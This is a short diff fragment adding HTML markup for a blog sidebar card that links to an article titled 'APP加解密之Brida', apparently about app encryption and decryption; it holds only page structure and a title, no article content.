+                        data-hash="md5-NQjY&#43;dgTaZYxYVihryfnCg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">APP加解密之Brida</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
 
      
     
